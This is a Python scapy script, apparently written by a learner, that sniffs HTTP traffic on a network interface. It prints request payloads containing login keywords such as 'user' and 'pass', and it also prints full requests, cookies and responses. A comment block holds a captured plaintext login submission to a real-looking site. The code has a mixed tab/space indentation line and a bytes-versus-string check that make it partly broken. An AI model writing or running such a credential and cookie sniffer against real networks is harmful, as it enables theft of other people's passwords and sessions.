import scapy.all as scapy
from scapy.layers import http


def sniffer(interface):
    scapy.sniff( iface=interface , store = False , prn =url_sniff_req )


def packet_cleansing(packet):
    if packet.haslayer(http.HTTPRequest):

        if packet.haslayer(scapy.Raw):
            text=(packet[scapy.Raw].load)
            keywords = [ "username","name","login","user","pass","password","uname"]
            #print(packet[scapy.Raw].load)

            for i in keywords:
                if i in text:

                    print(text)


            #if "name" in text:
                #this is cehciking substring in a string
                #say if u want to check some possibilites of substring in the text then u put tehm in list and iterate them
                #print(packet[scapy.Raw].load)


            #print(packet[scapy.Raw].load)
            #this will proint every thing ...but we want only those in which load contains username a substring

            #print(packet[scapy.Ethernet])
    #print(packet.show())


    """
    ###[ Raw ]### 
                 load      = 'name=hacker&pass=mahidhar&openid_identifier=&op=Log+in&remember_me=1&form_build_id=form-dZenzfXH7V8tIPBOqXuMOR9CYOop7doviM3Fid-sd9s&form_id=user_login_block&openid.return_to=http%3A%2F%2Fwww.polychaetes.marbigen.org%2F%3Fq%3Dopenid%2Fauthenticate%26destination%3Dscratchpads-front'
    
    
    
    """

def url_sniff_req(packet):
    if packet.haslayer(http.HTTPRequest):
	print(packet.show())
        #print(packet[http.HTTPRequest].Referer)
        #print(packet[http.HTTPRequest].Cookie)

def url_sniff_req2(packet):
    if packet.haslayer(http.HTTPRequest):
        print(packet[http.HTTPRequest].show())
        #print(packet[http.HTTPRequest].Referer)
        print("********")


def cookie_sniffer_req(packet):
    if packet.haslayer(http.HTTPRequest):
        print(packet[http.HTTPRequest].Cookie)



def url_sniff_res(packet):
    if packet.haslayer(http.HTTPResponse):
        print(packet[http.HTTPResponse].show())


sniffer("eth1")
